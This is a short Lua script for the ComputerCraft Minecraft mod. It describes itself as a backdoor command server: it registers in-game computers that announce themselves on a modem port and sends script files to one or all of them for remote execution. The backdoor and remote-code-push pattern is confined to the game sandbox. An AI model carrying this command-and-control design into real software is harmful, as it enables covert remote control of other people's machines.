--Server for backdoor commands
_ENV.string.split = function(inputstr, sep)
    if sep == nil then
        sep = "%s"
    end
    local t={}
    for str in string.gmatch(inputstr, "([^"..sep.."]+)") do
        table.insert(t, str)
    end
    return t
end

local backdoorComps = {}
local mainport = 1489;
local modem = peripheral.find("modem") or error("A modem is required");

do -- Backdoor module
    local Backdoor = {}
    Backdoor.Comps = backdoorComps;
    function Backdoor:Send(CompId, script)
        local port = Backdoor.Comps[CompId];

        if fs.exists(script) then
            local file = fs.open(script, "r")
            if not file.readAll then file.readAll = function() return "" end end;
            script = file.readAll();
            file.close();
        end
        
        if string.lower(CompId) == "all" then
            for _, CompPort in pairs(Backdoor.Comps) do
                modem.transmit(CompPort, mainport, script or "")
            end
        elseif port then
            modem.transmit(port, mainport, script or "")
        end
    end
end

modem.open(mainport); -- This is so the server can request the id

function Check(event, side, channel, replyChannel, message, distance)
    if channel == mainport then
        local num = tonumber(message);
        if num ~= nil then
            backdoorComps[num] = replyChannel;
            print(num, replyChannel)
        end
    end
end

function listen()
    local event, side, channel, replyChannel, message, distance = os.pullEventRaw("modem_message");
    Check(event, side, channel, replyChannel, message, distance)
end

function toBackground()
    shell.run("/rom/programs/advanced/multishell")
end
--İts working only advanced computers...--
parallel.waitForAny(toBackground , listen)
